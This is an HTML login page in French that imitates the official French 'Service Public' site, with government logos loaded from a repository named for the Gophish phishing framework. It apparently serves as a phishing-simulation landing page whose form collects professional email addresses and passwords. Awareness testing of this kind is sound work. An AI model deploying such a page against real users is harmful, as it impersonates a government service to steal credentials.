<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Se connecter – TEST</title>

<link rel="icon" type="image/png" sizes="32x32"
      href="https://raw.githubusercontent.com/MiK4K/Gophish-Allauch/main/img/logo_rep_fr.png?v=99">


<style>
:root{
  --blue:#000091;
  --blue-soft:#eef0ff;
  --text:#161616;
  --muted:#6a6a6a;
  --input:#f5f5f5;
}

/* ===== BASE ===== */
body{
  margin:0;
  background:#ffffff;
  font-family:Arial, Helvetica, sans-serif;
  color:var(--text);
}

/* ===== HEADER ===== */
.test-header{
  background:#ffffff;
  border-bottom:1px solid #e5e5e5;
}

.test-header-inner{
  max-width:1200px;
  margin:0 auto;
  padding:12px 24px;
  display:flex;
  align-items:center;
}

.test-header-left{
  display:flex;
  align-items:center;
  gap:12px;
}

.rf-logo{
  height:48px;
}

.test-title{
  line-height:1.15;
}

.test-title .big{
  font-size:24px;
  font-weight:700;
  letter-spacing:0.3px;
}

.test-title .small{
  font-size:11px;
  color:#6a6a6a;
  text-transform:uppercase;
  margin-top:2px;
}

/* ===== CONTENU CENTRAL ===== */
.wrap{
  max-width:560px;
  margin:32px auto 64px auto;
  padding:0 16px;
}

/* ===== SELECTEUR LANGUE ===== */
.lang-container{
  position:relative;
  width:190px;
  margin:0 auto 48px auto;
}

.lang-trigger{
  width:100%;
  height:40px;
  display:flex;
  align-items:center;
  gap:10px;
  padding:0 12px;
  background:#ffffff;
  border:1px solid #e5e5e5;
  color:var(--blue);
  font-size:15px;
  cursor:pointer;
}

.lang-icon{font-weight:700;}
.lang-text{flex:1;text-align:left;}
.lang-caret{font-size:12px;}

.lang-dropdown{
  position:absolute;
  top:42px;
  left:0;
  width:100%;
  background:#ffffff;
  border:1px solid #e5e5e5;
  box-shadow:0 8px 20px rgba(0,0,0,0.18);
  display:none;
  z-index:50;
}

.lang-option{
  padding:12px;
  font-size:15px;
  color:var(--blue);
}

.lang-option.active{
  background:var(--blue-soft);
  border-left:4px solid var(--blue);
}

/* ===== TITRE PAGE ===== */
.title{
  font-size:40px;
  font-weight:700;
  margin-bottom:48px;
  text-align:center;
}

/* ===== CARRÉ BLEU ===== */
.info-box{
  border:2px solid var(--blue);
  padding:32px;
}

/* ===== FORMULAIRE ===== */
.form-block{
  max-width:520px;
  margin:0 auto;
}

label{
  display:block;
  font-size:16px;
  margin-bottom:8px;
}

.hint{
  font-size:14px;
  color:var(--muted);
  margin-bottom:8px;
}

input{
  width:100%;
  border:none;
  border-bottom:2px solid #3a3a3a;
  background:var(--input);
  padding:14px 10px;
  font-size:16px;
  margin-bottom:32px;
}

.btn{
  background:#000000;
  color:#ffffff;
  border:none;
  padding:14px 28px;
  font-size:16px;
  font-weight:700;
  cursor:pointer;
}

.form-links{
  margin-top:24px;
  text-align:right;
}

.form-links a{
  display:block;
  color:var(--blue);
  text-decoration:none;
  font-size:15px;
  margin-top:8px;
}
</style>
</head>

<body>

<!-- ===== HEADER ===== -->
<header class="test-header">
  <div class="test-header-inner">
    <div class="test-header-left">
      <img src="https://raw.githubusercontent.com/MiK4K/Gophish-Allauch/main/img/Logo_republique_francaise.png"
           alt="République Française"
           class="rf-logo">

      <div class="test-title">
        <div class="big">Service Public</div>
        <div class="small">Le site officiel de l’administration française</div>
      </div>
    </div>
  </div>
</header>

<div class="wrap">

  <!-- SELECTEUR DE LANGUE -->
  <div class="lang-container">
    <button class="lang-trigger" id="langTrigger">
      <span class="lang-icon">文A</span>
      <span class="lang-text">FR - Français</span>
      <span class="lang-caret">▾</span>
    </button>

    <div class="lang-dropdown" id="langDropdown">
      <div class="lang-option active">FR - Français</div>
      <div class="lang-option">EN - English</div>
    </div>
  </div>

  <div class="title">Se connecter</div>

  <div class="info-box">
    <form method="POST" class="form-block">

      <label>Votre email professionnel</label>
      <div class="hint">Par exemple : prenom.nom@organisation.com</div>
      <input type="email" name="email" required>

      <label>Votre mot de passe</label>
      <input type="password" name="password" required>

      <button type="submit" class="btn">Se connecter</button>

      <div class="form-links">
        <a href="#">Mot de passe oublié ? →</a>
        <a href="#">Pas encore de compte ? →</a>
      </div>

    </form>
  </div>

</div>

<script>
const trigger = document.getElementById('langTrigger');
const dropdown = document.getElementById('langDropdown');

trigger.addEventListener('click', (e) => {
  e.stopPropagation();
  dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
});

document.addEventListener('click', () => {
  dropdown.style.display = 'none';
});
</script>

</body>
</html>
